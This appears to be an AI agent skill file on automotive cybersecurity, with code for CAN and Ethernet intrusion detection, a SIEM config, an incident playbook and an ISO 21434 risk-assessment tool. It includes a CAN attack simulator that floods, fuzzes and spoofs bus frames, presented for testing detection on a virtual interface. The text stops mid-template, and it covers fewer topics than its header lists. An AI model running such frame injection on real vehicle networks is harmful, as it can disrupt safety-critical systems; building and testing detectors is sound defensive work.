---
name: automotive-cybersecurity
description: >
  Automotive Cybersecurity expertise. Covers 6 topics: Intrusion Detection Prevention, Iso 21434 Compliance, Penetration Testing Automotive, Secure Boot Chain, Secure Software Development.
tags: [automotive, automotive-cybersecurity]
---

# Automotive Cybersecurity

## Intrusion Detection Prevention

# Intrusion Detection & Prevention Skill

## Overview

Expert skill for implementing IDS/IPS (Intrusion Detection/Prevention Systems) in automotive networks. Covers CAN bus anomaly detection, network traffic analysis, SIEM integration, honeypot deployment, and incident response playbooks.

## Core Competencies

### IDS/IPS Architecture
- **Network-based IDS (NIDS)**: Monitor CAN, FlexRay, Ethernet traffic
- **Host-based IDS (HIDS)**: Monitor ECU system calls, file integrity
- **Anomaly Detection**: Machine learning for baseline behavior
- **Signature-based Detection**: Known attack patterns
- **Prevention Mechanisms**: Frame filtering, rate limiting, isolation

### Detection Techniques
- **Statistical Analysis**: Abnormal message rates, timing violations
- **Protocol Validation**: Malformed frames, invalid DLC
- **Behavioral Analysis**: Unexpected ECU communication patterns
- **Entropy Analysis**: Randomness in payload data

## CAN Bus Intrusion Detection System

### CAN IDS Implementation

```python
#!/usr/bin/env python3
"""
CAN Bus Intrusion Detection System
Real-time anomaly detection for automotive CAN networks
"""

import can
import time
import statistics
from collections import defaultdict, deque
from datetime import datetime, timedelta
import json

class CANIDSEngine:
    """Core CAN IDS detection engine"""

    def __init__(self, can_interface: str = 'can0', window_size: int = 100):
        self.interface = can_interface
        self.bus = can.interface.Bus(channel=can_interface, bustype='socketcan')

        # Message statistics per CAN ID
        self.msg_stats = defaultdict(lambda: {
            'count': 0,
            'last_timestamp': None,
            'intervals': deque(maxlen=window_size),
            'dlc_values': deque(maxlen=window_size),
            'payloads': deque(maxlen=window_size)
        })

        # Learned baseline (normal behavior)
        self.baseline = {}
        self.alerts = []

        print(f"=== CAN IDS Engine Initialized ===")
        print(f"[INFO] Interface: {can_interface}")
        print(f"[INFO] Window size: {window_size}")

    def learn_baseline(self, duration_seconds: int = 300):
        """Learn normal CAN traffic baseline (5 minutes)"""
        print(f"\n=== Learning Baseline (mode) ===")
        print(f"[INFO] Duration: {duration_seconds} seconds")
        print(f"[INFO] Capturing normal traffic...")

        start_time = time.time()
        message_count = 0

        while (time.time() - start_time) < duration_seconds:
            msg = self.bus.recv(timeout=1.0)
            if msg is None:
                continue

            self._update_statistics(msg)
            message_count += 1

            if message_count % 1000 == 0:
                elapsed = int(time.time() - start_time)
                print(f"[INFO] {message_count} messages captured ({elapsed}s)")

        # Compute baseline statistics
        self._compute_baseline()

        print(f"\n[PASS] Baseline learning complete")
        print(f"[INFO] Total messages: {message_count}")
        print(f"[INFO] Unique CAN IDs: {len(self.baseline)}")

    def _update_statistics(self, msg: can.Message):
        """Update statistics for received message"""
        stats = self.msg_stats[msg.arbitration_id]
        stats['count'] += 1

        # Calculate inter-arrival time
        if stats['last_timestamp'] is not None:
            interval = msg.timestamp - stats['last_timestamp']
            stats['intervals'].append(interval)

        stats['last_timestamp'] = msg.timestamp
        stats['dlc_values'].append(msg.dlc)
        stats['payloads'].append(bytes(msg.data))

    def _compute_baseline(self):
        """Compute baseline statistics from learned data"""
        print(f"\n[INFO] Computing baseline statistics...")

        for can_id, stats in self.msg_stats.items():
            if stats['count'] < 10:
                continue  # Insufficient data

            # Interval statistics
            intervals = list(stats['intervals'])
            interval_mean = statistics.mean(intervals) if intervals else 0
            interval_std = statistics.stdev(intervals) if len(intervals) > 1 else 0

            # Expected DLC
            dlc_mode = max(set(stats['dlc_values']), key=list(stats['dlc_values']).count)

            # Payload entropy (randomness)
            payloads = list(stats['payloads'])
            entropy_mean = statistics.mean([self._calculate_entropy(p) for p in payloads])

            self.baseline[can_id] = {
                'message_count': stats['count'],
                'interval_mean': interval_mean,
                'interval_std': interval_std,
                'interval_min': interval_mean - (3 * interval_std),  # 3-sigma
                'interval_max': interval_mean + (3 * interval_std),
                'expected_dlc': dlc_mode,
                'entropy_mean': entropy_mean,
                'payloads_sample': payloads[:10]  # Store samples for comparison
            }

            print(f"  CAN ID 0x{can_id:03X}: "
                  f"interval={interval_mean*1000:.2f}ms±{interval_std*1000:.2f}ms, "
                  f"DLC={dlc_mode}, "
                  f"entropy={entropy_mean:.2f}")

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of payload"""
        if len(data) == 0:
            return 0.0

        from collections import Counter
        import math

        counter = Counter(data)
        length = len(data)

        entropy = 0.0
        for count in counter.values():
            p = count / length
            entropy -= p * math.log2(p)

        return entropy

    def detect_anomalies(self, msg: can.Message) -> list:
        """Detect anomalies in received message"""
        anomalies = []
        can_id = msg.arbitration_id

        if can_id not in self.baseline:
            anomalies.append({
                'type': 'UNKNOWN_CAN_ID',
                'severity': 'HIGH',
                'description': f'New CAN ID 0x{can_id:03X} not seen during baseline',
                'timestamp': msg.timestamp
            })
            return anomalies

        baseline = self.baseline[can_id]
        stats = self.msg_stats[can_id]

        # Check 1: Inter-arrival time anomaly
        if stats['last_timestamp'] is not None:
            interval = msg.timestamp - stats['last_timestamp']

            if interval < baseline['interval_min']:
                anomalies.append({
                    'type': 'MESSAGE_FLOODING',
                    'severity': 'HIGH',
                    'description': f'CAN ID 0x{can_id:03X} flooding: '
                                 f'interval {interval*1000:.2f}ms < expected {baseline["interval_min"]*1000:.2f}ms',
                    'timestamp': msg.timestamp,
                    'can_id': can_id
                })

            elif interval > baseline['interval_max']:
                anomalies.append({
                    'type': 'MESSAGE_SUPPRESSION',
                    'severity': 'MEDIUM',
                    'description': f'CAN ID 0x{can_id:03X} delayed: '
                                 f'interval {interval*1000:.2f}ms > expected {baseline["interval_max"]*1000:.2f}ms',
                    'timestamp': msg.timestamp,
                    'can_id': can_id
                })

        # Check 2: DLC anomaly
        if msg.dlc != baseline['expected_dlc']:
            anomalies.append({
                'type': 'DLC_ANOMALY',
                'severity': 'MEDIUM',
                'description': f'CAN ID 0x{can_id:03X} unexpected DLC: '
                             f'{msg.dlc} != expected {baseline["expected_dlc"]}',
                'timestamp': msg.timestamp,
                'can_id': can_id
            })

        # Check 3: Payload entropy anomaly (possible injection/fuzzing)
        payload_entropy = self._calculate_entropy(bytes(msg.data))
        entropy_diff = abs(payload_entropy - baseline['entropy_mean'])

        if entropy_diff > 2.0:  # Significant entropy change
            anomalies.append({
                'type': 'PAYLOAD_ANOMALY',
                'severity': 'HIGH',
                'description': f'CAN ID 0x{can_id:03X} unusual payload entropy: '
                             f'{payload_entropy:.2f} (expected {baseline["entropy_mean"]:.2f})',
                'timestamp': msg.timestamp,
                'can_id': can_id,
                'payload': msg.data.hex()
            })

        # Update statistics
        self._update_statistics(msg)

        return anomalies

    def monitor(self, duration_seconds: int = None, prevention_mode: bool = False):
        """Monitor CAN bus for intrusions"""
        print(f"\n=== CAN IDS Monitoring ===")
        print(f"[INFO] Prevention mode: {prevention_mode}")

        start_time = time.time()
        message_count = 0
        anomaly_count = 0

        try:
            while True:
                if duration_seconds and (time.time() - start_time) > duration_seconds:
                    break

                msg = self.bus.recv(timeout=1.0)
                if msg is None:
                    continue

                message_count += 1

                # Detect anomalies
                anomalies = self.detect_anomalies(msg)

                if anomalies:
                    anomaly_count += len(anomalies)

                    for anomaly in anomalies:
                        self._handle_alert(anomaly, msg, prevention_mode)

                # Status update every 5000 messages
                if message_count % 5000 == 0:
                    elapsed = int(time.time() - start_time)
                    print(f"[INFO] {message_count} messages, {anomaly_count} anomalies ({elapsed}s)")

        except KeyboardInterrupt:
            print(f"\n[INFO] Monitoring stopped by user")

        print(f"\n=== Monitoring Summary ===")
        print(f"[INFO] Total messages: {message_count}")
        print(f"[INFO] Anomalies detected: {anomaly_count}")
        print(f"[INFO] Detection rate: {anomaly_count/message_count*100:.2f}%")

    def _handle_alert(self, anomaly: dict, msg: can.Message, prevention_mode: bool):
        """Handle detected anomaly"""
        timestamp = datetime.fromtimestamp(anomaly['timestamp']).strftime('%H:%M:%S.%f')[:-3]

        print(f"\n[ALERT] {anomaly['severity']} - {anomaly['type']} @ {timestamp}")
        print(f"  Description: {anomaly['description']}")
        print(f"  CAN ID: 0x{msg.arbitration_id:03X}, DLC: {msg.dlc}, Data: {msg.data.hex()}")

        # Log alert
        self.alerts.append(anomaly)

        # Prevention actions
        if prevention_mode:
            if anomaly['type'] == 'MESSAGE_FLOODING':
                print(f"  [BLOCK] Rate limiting CAN ID 0x{msg.arbitration_id:03X}")
                # In real system: configure CAN controller filters

            elif anomaly['type'] == 'UNKNOWN_CAN_ID':
                print(f"  [BLOCK] Dropping frames from unknown CAN ID 0x{msg.arbitration_id:03X}")

            elif anomaly['type'] == 'PAYLOAD_ANOMALY':
                print(f"  [ISOLATE] Potential fuzzing/injection detected - isolating ECU")

    def export_alerts(self, output_file: str):
        """Export alerts to JSON"""
        with open(output_file, 'w') as f:
            json.dump(self.alerts, f, indent=2)

        print(f"[INFO] Alerts exported: {output_file}")


# Example: Simulate CAN attacks and detect them
def demo_can_ids():
    import os

    # Setup virtual CAN interface
    os.system('sudo modprobe vcan')
    os.system('sudo ip link add dev vcan0 type vcan')
    os.system('sudo ip link set up vcan0')

    print("=== CAN IDS Demo ===")
    print("[INFO] Using virtual CAN interface vcan0")

    # Create IDS
    ids = CANIDSEngine(can_interface='vcan0', window_size=50)

    # Simulate normal traffic generator (in separate process)
    print("\n[INFO] Start normal CAN traffic generator in another terminal:")
    print("  python3 can_traffic_generator.py --interface vcan0 --scenario normal")

    input("\nPress Enter when normal traffic is running...")

    # Learn baseline
    ids.learn_baseline(duration_seconds=60)

    # Monitor for attacks
    print("\n[INFO] Now inject attacks using:")
    print("  python3 can_attack_simulator.py --interface vcan0 --attack flooding")

    input("\nPress Enter to start monitoring...")

    ids.monitor(duration_seconds=120, prevention_mode=True)

    # Export results
    ids.export_alerts('/tmp/can_ids_alerts.json')

if __name__ == "__main__":
    demo_can_ids()
```

### CAN Attack Simulator (for testing)

```python
#!/usr/bin/env python3
"""
CAN Attack Simulator for IDS Testing
Generates various attack scenarios
"""

import can
import time
import random

class CANAttackSimulator:
    def __init__(self, interface: str = 'vcan0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        print(f"=== CAN Attack Simulator ===")
        print(f"[INFO] Interface: {interface}")

    def attack_flooding(self, target_can_id: int = 0x123, duration: int = 10):
        """Message flooding attack"""
        print(f"\n[ATTACK] Flooding CAN ID 0x{target_can_id:03X}")

        start_time = time.time()
        count = 0

        while (time.time() - start_time) < duration:
            msg = can.Message(
                arbitration_id=target_can_id,
                data=[0x00] * 8,
                is_extended_id=False
            )
            self.bus.send(msg)
            count += 1
            # No delay - flood as fast as possible

        print(f"[INFO] Sent {count} messages in {duration}s")

    def attack_fuzzing(self, target_can_id: int = 0x456, duration: int = 10):
        """Payload fuzzing attack"""
        print(f"\n[ATTACK] Fuzzing CAN ID 0x{target_can_id:03X}")

        start_time = time.time()
        count = 0

        while (time.time() - start_time) < duration:
            # Random payload
            payload = [random.randint(0, 255) for _ in range(8)]

            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )
            self.bus.send(msg)
            count += 1
            time.sleep(0.01)  # 10ms interval

        print(f"[INFO] Sent {count} fuzzed messages")

    def attack_spoofing(self, spoof_can_id: int = 0x789, duration: int = 10):
        """ECU spoofing attack (new CAN ID)"""
        print(f"\n[ATTACK] Spoofing new CAN ID 0x{spoof_can_id:03X}")

        start_time = time.time()
        count = 0

        while (time.time() - start_time) < duration:
            msg = can.Message(
                arbitration_id=spoof_can_id,
                data=[0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, 0x00, 0x00],
                is_extended_id=False
            )
            self.bus.send(msg)
            count += 1
            time.sleep(0.02)

        print(f"[INFO] Sent {count} spoofed messages")

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 can_attack_simulator.py --interface vcan0 --attack [flooding|fuzzing|spoofing]")
        sys.exit(1)

    interface = sys.argv[2]
    attack_type = sys.argv[4]

    attacker = CANAttackSimulator(interface=interface)

    if attack_type == "flooding":
        attacker.attack_flooding(target_can_id=0x123, duration=30)
    elif attack_type == "fuzzing":
        attacker.attack_fuzzing(target_can_id=0x456, duration=30)
    elif attack_type == "spoofing":
        attacker.attack_spoofing(spoof_can_id=0x999, duration=30)
    else:
        print(f"Unknown attack type: {attack_type}")
```

## Ethernet IDS (Gateway/TCU)

```python
#!/usr/bin/env python3
"""
Ethernet-based IDS for Automotive Gateway/TCU
Deep packet inspection for HTTP, MQTT, SOME/IP
"""

from scapy.all import sniff, IP, TCP, UDP
from collections import defaultdict
import time

class EthernetIDS:
    """Ethernet network IDS"""

    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.connection_tracker = defaultdict(lambda: {
            'count': 0,
            'first_seen': None,
            'last_seen': None
        })
        self.alerts = []

        print(f"=== Ethernet IDS Initialized ===")
        print(f"[INFO] Interface: {interface}")

    def packet_callback(self, packet):
        """Process captured packet"""
        if IP not in packet:
            return

        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        # Track connection
        conn_key = f"{src_ip}:{dst_ip}"
        tracker = self.connection_tracker[conn_key]
        tracker['count'] += 1
        tracker['last_seen'] = time.time()

        if tracker['first_seen'] is None:
            tracker['first_seen'] = time.time()

        # Detection rules
        if TCP in packet:
            self._check_tcp_anomalies(packet)
        elif UDP in packet:
            self._check_udp_anomalies(packet)

    def _check_tcp_anomalies(self, packet):
        """Check for TCP-based attacks"""
        tcp = packet[TCP]

        # SYN flood detection
        if tcp.flags == 'S':
            src_ip = packet[IP].src
            syn_count = sum(1 for key in self.connection_tracker
                          if key.startswith(src_ip) and
                          time.time() - self.connection_tracker[key]['first_seen'] < 10)

            if syn_count > 100:
                alert = {
                    'type': 'SYN_FLOOD',
                    'severity': 'HIGH',
                    'source': src_ip,
                    'description': f'Possible SYN flood from {src_ip} ({syn_count} connections in 10s)'
                }
                self._raise_alert(alert)

        # Port scanning detection
        dst_port = tcp.dport
        if dst_port > 1024:  # Non-standard ports
            src_ip = packet[IP].src
            unique_ports = len(set(
                key.split(':')[1] for key in self.connection_tracker
                if key.startswith(src_ip)
            ))

            if unique_ports > 50:
                alert = {
                    'type': 'PORT_SCAN',
                    'severity': 'MEDIUM',
                    'source': src_ip,
                    'description': f'Port scanning detected from {src_ip} ({unique_ports} unique ports)'
                }
                self._raise_alert(alert)

    def _check_udp_anomalies(self, packet):
        """Check for UDP-based attacks"""
        udp = packet[UDP]

        # SOME/IP message validation (automotive middleware)
        if udp.dport in [30490, 30491, 30492]:  # SOME/IP ports
            payload = bytes(packet[UDP].payload)

            if len(payload) < 16:
                alert = {
                    'type': 'MALFORMED_SOMEIP',
                    'severity': 'MEDIUM',
                    'source': packet[IP].src,
                    'description': 'Malformed SOME/IP message (too short)'
                }
                self._raise_alert(alert)

    def _raise_alert(self, alert: dict):
        """Raise security alert"""
        print(f"\n[ALERT] {alert['severity']} - {alert['type']}")
        print(f"  {alert['description']}")
        self.alerts.append(alert)

    def start_monitoring(self, count: int = 1000):
        """Start packet capture"""
        print(f"\n[INFO] Starting Ethernet monitoring ({count} packets)...")
        sniff(iface=self.interface, prn=self.packet_callback, count=count)

        print(f"\n=== Monitoring Complete ===")
        print(f"[INFO] Alerts raised: {len(self.alerts)}")

if __name__ == "__main__":
    ids = EthernetIDS(interface='eth0')
    ids.start_monitoring(count=5000)
```

## SIEM Integration (ELK Stack)

```yaml
# Logstash configuration for CAN IDS alerts
input {
  file {
    path => "/var/log/can_ids/alerts.json"
    start_position => "beginning"
    codec => "json"
  }
}

filter {
  # Parse CAN IDS alerts
  if [type] == "MESSAGE_FLOODING" {
    mutate {
      add_field => { "severity_score" => 9 }
      add_tag => ["dos_attack"]
    }
  }

  if [type] == "PAYLOAD_ANOMALY" {
    mutate {
      add_field => { "severity_score" => 8 }
      add_tag => ["potential_injection"]
    }
  }

  # Convert CAN ID to hex
  ruby {
    code => "event.set('can_id_hex', '0x%03X' % event.get('can_id'))"
  }

  # GeoIP lookup for external attacks
  if [source_ip] {
    geoip {
      source => "source_ip"
      target => "geoip"
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "automotive-ids-%{+YYYY.MM.dd}"
  }

  # High severity alerts to Slack
  if [severity] == "HIGH" {
    http {
      url => "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
      http_method => "post"
      format => "json"
      content_type => "application/json"
      message => '{
        "text": "🚨 CAN IDS Alert: %{type}",
        "attachments": [{
          "color": "danger",
          "fields": [
            {"title": "Description", "value": "%{description}"},
            {"title": "CAN ID", "value": "%{can_id_hex}"},
            {"title": "Timestamp", "value": "%{@timestamp}"}
          ]
        }]
      }'
    }
  }
}
```

## Incident Response Playbook

```yaml
# Automotive Cybersecurity Incident Response Playbook
incident_response:
  phase_1_identification:
    - alert: "IDS detects anomaly"
    - verify: "Confirm alert is not false positive"
    - classify: "Determine attack type and severity"
    - escalate: "Notify security team and OEM SOC"

  phase_2_containment:
    short_term:
      - action: "Isolate affected ECU/network segment"
      - method: "Gateway firewall rules, CAN filters"
      - verify: "Confirm attack traffic blocked"

    long_term:
      - action: "Patch vulnerable software"
      - method: "OTA security update"
      - timeline: "< 72 hours per UN R155"

  phase_3_eradication:
    - identify_root_cause: "Vulnerability analysis, forensics"
    - remove_threat: "Firmware update, key revocation"
    - verify_clean: "Scan for persistence mechanisms"

  phase_4_recovery:
    - restore_service: "Reboot ECU, restore network"
    - validate: "Functional testing, regression testing"
    - monitor: "Enhanced monitoring for 7 days"

  phase_5_lessons_learned:
    - document: "Incident timeline, root cause, actions taken"
    - improve: "Update IDS signatures, patch other vehicles"
    - report: "Notify regulatory authorities (UN R155 requirement)"
```

## Best Practices

1. **Layered Defense**: Deploy IDS at multiple layers (CAN, Ethernet, application)
2. **Baseline Learning**: Capture 24-hour baseline before production deployment
3. **False Positive Tuning**: Iterate on detection rules to reduce false positives < 1%
4. **SIEM Integration**: Centralize logs for fleet-wide threat intelligence
5. **Incident Playbooks**: Pre-define response procedures for < 15 minute MTTR

## References

- NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems
- ISO 21434: Cybersecurity Engineering (Clause 11: Incident Response)
- AUTOSAR SecOC: Secure Onboard Communication specification
- J3061: Cybersecurity Guidebook for Cyber-Physical Vehicle Systems

---

## Iso 21434 Compliance

# ISO/SAE 21434 Compliance Skill

## Overview

Expert skill for implementing ISO/SAE 21434 cybersecurity engineering standard for road vehicles. Covers CSMS (Cybersecurity Management System), TARA (Threat Analysis and Risk Assessment), cybersecurity concept phase, product development, and operations/maintenance.

## Core Competencies

### ISO/SAE 21434 Framework
- **Cybersecurity Management System (CSMS)**: Organizational processes, roles, responsibilities
- **Concept Phase**: Item definition, cybersecurity goals, threat scenarios
- **Product Development**: Security requirements, architecture design, verification
- **Operations & Maintenance**: Incident response, vulnerability management, EOL handling
- **Supporting Processes**: Risk assessment, security testing, change management

### TARA Methodology
- **Asset Identification**: Identify critical assets (ECUs, data, communication channels)
- **Threat Scenario Definition**: STRIDE/DREAD modeling, attack trees
- **Impact Rating**: ASIL-D alignment, damage scenarios (safety, financial, operational, privacy)
- **Attack Feasibility**: Elapsed time, specialist expertise, knowledge of item, window of opportunity, equipment
- **Risk Determination**: Risk = Impact × Attack Feasibility
- **Risk Treatment**: Avoid, reduce, share, retain

### UN R155 & R156 Alignment
- **R155**: Cybersecurity management system requirements
- **R156**: Software update management system requirements
- **Type Approval**: Demonstration of compliance for vehicle homologation

## ISO 21434 Workflow

### Phase 1: Concept Phase

```yaml
# Item Definition Template
item_definition:
  item_name: "Telematics Control Unit (TCU)"
  item_id: "TCU-2024-001"
  description: "4G/5G connected telematics unit with V2X capability"
  boundaries:
    physical: "TCU ECU, antenna, power supply"
    logical: "CAN, Ethernet, cellular modem interfaces"
    temporal: "Ignition-on to ignition-off, OTA updates"

  assets:
    - name: "Vehicle Location Data"
      type: "Data"
      confidentiality: HIGH
      integrity: MEDIUM
      availability: MEDIUM

    - name: "Firmware Image"
      type: "Software"
      confidentiality: LOW
      integrity: HIGH
      availability: HIGH

    - name: "Private Key for V2X"
      type: "Cryptographic Material"
      confidentiality: CRITICAL
      integrity: CRITICAL
      availability: HIGH

  interfaces:
    - name: "CAN Bus Interface"
      protocol: "CAN 2.0B"
      threat_exposure: MEDIUM
      security_properties: ["message authentication"]

    - name: "Cellular Interface"
      protocol: "LTE/5G"
      threat_exposure: HIGH
      security_properties: ["TLS 1.3", "certificate pinning"]
```

### Phase 2: TARA Execution

```python
#!/usr/bin/env python3
"""
ISO 21434 TARA (Threat Analysis and Risk Assessment) Tool
Performs automated threat modeling and risk calculation
"""

from enum import Enum
from dataclasses import dataclass
from typing import List, Dict
import json

class ImpactLevel(Enum):
    NEGLIGIBLE = 1
    MODERATE = 2
    MAJOR = 3
    SEVERE = 4

class AttackFeasibility(Enum):
    VERY_LOW = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    VERY_HIGH = 5

class RiskLevel(Enum):
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    VERY_HIGH = 4

@dataclass
class Threat:
    threat_id: str
    name: str
    description: str
    threat_type: str  # Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation
    asset: str
    impact_safety: ImpactLevel
    impact_financial: ImpactLevel
    impact_operational: ImpactLevel
    impact_privacy: ImpactLevel

    # Attack Feasibility Parameters (ISO 21434 Table A.1)
    elapsed_time: int  # 0-19 points
    specialist_expertise: int  # 0-11 points
    knowledge_of_item: int  # 0-11 points
    window_of_opportunity: int  # 0-10 points
    equipment: int  # 0-9 points

@dataclass
class RiskAssessment:
    threat: Threat
    overall_impact: ImpactLevel
    attack_feasibility: AttackFeasibility
    risk_level: RiskLevel
    risk_value: int
    treatment: str
    justification: str

class TARAEngine:
    def __init__(self):
        self.threats = []
        self.assessments = []

    def calculate_attack_feasibility(self, threat: Threat) -> AttackFeasibility:
        """Calculate attack feasibility per ISO 21434 Annex G"""
        total_score = (
            threat.elapsed_time +
            threat.specialist_expertise +
            threat.knowledge_of_item +
            threat.window_of_opportunity +
            threat.equipment
        )

        # ISO 21434 Table G.1 mapping
        if total_score >= 37:
            return AttackFeasibility.VERY_LOW
        elif total_score >= 25:
            return AttackFeasibility.LOW
        elif total_score >= 13:
            return AttackFeasibility.MEDIUM
        elif total_score >= 10:
            return AttackFeasibility.HIGH
        else:
            return AttackFeasibility.VERY_HIGH

    def calculate_overall_impact(self, threat: Threat) -> ImpactLevel:
        """Determine worst-case impact across all categories"""
        impacts = [
            threat.impact_safety,
            threat.impact_financial,
            threat.impact_operational,
            threat.impact_privacy
        ]
        return max(impacts, key=lambda x: x.value)

    def determine_risk_level(self, impact: ImpactLevel, feasibility: AttackFeasibility) -> tuple:
        """Map impact and feasibility to risk level (ISO 21434 Table 9)"""
        risk_matrix = {
            (ImpactLevel.SEVERE, AttackFeasibility.VERY_HIGH): (RiskLevel.VERY_HIGH, 5),
            (ImpactLevel.SEVERE, AttackFeasibility.HIGH): (RiskLevel.VERY_HIGH, 5),
            (ImpactLevel.SEVERE, AttackFeasibility.MEDIUM): (RiskLevel.HIGH, 4),
            (ImpactLevel.SEVERE, AttackFeasibility.LOW): (RiskLevel.MEDIUM, 3),
            (ImpactLevel.SEVERE, AttackFeasibility.VERY_LOW): (RiskLevel.LOW, 2),

            (ImpactLevel.MAJOR, AttackFeasibility.VERY_HIGH): (RiskLevel.VERY_HIGH, 5),
            (ImpactLevel.MAJOR, AttackFeasibility.HIGH): (RiskLevel.HIGH, 4),
            (ImpactLevel.MAJOR, AttackFeasibility.MEDIUM): (RiskLevel.MEDIUM, 3),
            (ImpactLevel.MAJOR, AttackFeasibility.LOW): (RiskLevel.LOW, 2),
            (ImpactLevel.MAJOR, AttackFeasibility.VERY_LOW): (RiskLevel.LOW, 1),

            (ImpactLevel.MODERATE, AttackFeasibility.VERY_HIGH): (RiskLevel.HIGH, 4),
            (ImpactLevel.MODERATE, AttackFeasibility.HIGH): (RiskLevel.MEDIUM, 3),
            (ImpactLevel.MODERATE, AttackFeasibility.MEDIUM): (RiskLevel.MEDIUM, 2),
            (ImpactLevel.MODERATE, AttackFeasibility.LOW): (RiskLevel.LOW, 1),
            (ImpactLevel.MODERATE, AttackFeasibility.VERY_LOW): (RiskLevel.LOW, 1),
        }

        key = (impact, feasibility)
        return risk_matrix.get(key, (RiskLevel.LOW, 1))

    def assess_threat(self, threat: Threat) -> RiskAssessment:
        """Perform complete risk assessment for a threat"""
        overall_impact = self.calculate_overall_impact(threat)
        attack_feasibility = self.calculate_attack_feasibility(threat)
        risk_level, risk_value = self.determine_risk_level(overall_impact, attack_feasibility)

        # Determine treatment strategy
        if risk_value >= 4:
            treatment = "REDUCE"
            justification = "High/Very High risk requires mitigation controls"
        elif risk_value >= 3:
            treatment = "REDUCE or SHARE"
            justification = "Medium risk may require mitigation or transfer"
        else:
            treatment = "ACCEPT"
            justification = "Low risk acceptable with documentation"

        assessment = RiskAssessment(
            threat=threat,
            overall_impact=overall_impact,
            attack_feasibility=attack_feasibility,
            risk_level=risk_level,
            risk_value=risk_value,
            treatment=treatment,
            justification=justification
        )

        self.assessments.append(assessment)
        return assessment

    def generate_report(self, output_file: str):
        """Generate TARA report in JSON format"""
        report = {
            "tara_metadata": {
                "standard": "ISO/SAE 21434:2021",
                "version": "1.0",
                "date": "2026-03-19",
                "total_threats": len(self.assessments)
            },
            "risk_summary": {
                "very_high": sum(1 for a in self.assessments if a.risk_level == RiskLevel.VERY_HIGH),
                "high": sum(1 for a in self.assessments if a.risk_level == RiskLevel.HIGH),
                "medium": sum(1 for a in self.assessments if a.risk_level == RiskLevel.MEDIUM),
                "low": sum(1 for a in self.assessments if a.risk_level == RiskLevel.LOW)
            },
            "assessments": []
        }

        for assessment in self.assessments:
            report["assessments"].append({
                "threat_id": assessment.threat.threat_id,
                "threat_name": assessment.threat.name,
                "threat_type": assessment.threat.threat_type,
                "asset": assessment.threat.asset,
                "impact": assessment.overall_impact.name,
                "attack_feasibility": assessment.attack_feasibility.name,
                "feasibility_score": {
                    "elapsed_time": assessment.threat.elapsed_time,
                    "specialist_expertise": assessment.threat.specialist_expertise,
                    "knowledge_of_item": assessment.threat.knowledge_of_item,
                    "window_of_opportunity": assessment.threat.window_of_opportunity,
                    "equipment": assessment.threat.equipment,
                    "total": sum([
                        assessment.threat.elapsed_time,
                        assessment.threat.specialist_expertise,
                        assessment.threat.knowledge_of_item,
                        assessment.threat.window_of_opportunity,
                        assessment.threat.equipment
                    ])
                },
                "risk_level": assessment.risk_level.name,
                "risk_value": assessment.risk_value,
                "treatment": assessment.treatment,
                "justification": assessment.justification
            })

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"TARA report generated: {output_file}")


# Example: TCU TARA
def run_tcu_tara():
    tara = TARAEngine()

    # Threat T-001: Remote Code Execution via OTA
    threat_rce = Threat(
        threat_id="T-001",
        name="Remote Code Execution via Malicious OTA Update",
        description="Attacker injects malicious firmware via compromised OTA server",
        threat_type="Tampering",
        asset="Firmware Image",
        impact_safety=ImpactLevel.SEVERE,  # Can control vehicle functions
        impact_financial=ImpactLevel.MAJOR,  # Massive recall
        impact_operational=ImpactLevel.SEVERE,  # Complete TCU compromise
        impact_privacy=ImpactLevel.MAJOR,  # Access to all telemetry data
        elapsed_time=13,  # Days to weeks (13-16 points per ISO 21434)
        specialist_expertise=6,  # Proficient (6 points)
        knowledge_of_item=3,  # Public information (0-3 points)
        window_of_opportunity=4,  # Easy (0-4 points)
        equipment=4  # Standard equipment (4 points)
    )

    # Threat T-002: CAN Bus Message Injection
    threat_can_injection = Threat(
        threat_id="T-002",
        name="CAN Bus Message Injection",
        description="Attacker with physical access injects spoofed CAN messages",
        threat_type="Spoofing",
        asset="CAN Bus Interface",
        impact_safety=ImpactLevel.MAJOR,  # Can send false sensor data
        impact_financial=ImpactLevel.MODERATE,
        impact_operational=ImpactLevel.MAJOR,
        impact_privacy=ImpactLevel.NEGLIGIBLE,
        elapsed_time=16,  # < 1 day (16-19 points)
        specialist_expertise=6,  # Proficient
        knowledge_of_item=7,  # Restricted information (4-7 points)
        window_of_opportunity=7,  # Moderate (5-7 points)
        equipment=6  # Specialized equipment (5-7 points)
    )

    # Threat T-003: V2X Certificate Theft
    threat_cert_theft = Threat(
        threat_id="T-003",
        name="V2X Certificate Private Key Extraction",
        description="Physical attack to extract private key from HSM",
        threat_type="Information Disclosure",
        asset="Private Key for V2X",
        impact_safety=ImpactLevel.MAJOR,  # Spoofed V2X messages
        impact_financial=ImpactLevel.SEVERE,  # PKI infrastructure compromise
        impact_operational=ImpactLevel.MAJOR,
        impact_privacy=ImpactLevel.SEVERE,  # Impersonation attacks
        elapsed_time=7,  # More than 1 month (7-12 points)
        specialist_expertise=0,  # Expert (0 points)
        knowledge_of_item=0,  # Sensitive information (0 points)
        window_of_opportunity=7,  # Moderate
        equipment=0  # Bespoke equipment (0 points)
    )

    # Assess all threats
    tara.assess_threat(threat_rce)
    tara.assess_threat(threat_can_injection)
    tara.assess_threat(threat_cert_theft)

    # Generate report
    tara.generate_report("/tmp/tcu_tara_report.json")

    # Print summary
    print("\n=== TARA Summary ===")
    for assessment in tara.assessments:
        print(f"\n{assessment.threat.threat_id}: {assessment.threat.name}")
        print(f"  Impact: {assessment.overall_impact.name}")
        print(f"  Attack Feasibility: {assessment.attack_feasibility.name}")
        print(f"  Risk Level: {assessment.risk_level.name} (Value: {assessment.risk_value})")
        print(f"  Treatment: {assessment.treatment}")

if __name__ == "__main__":
    run_tcu_tara()
```

### Phase 3: Cybersecurity Concept

```yaml
# Cybersecurity Concept Template
cybersecurity_concept:
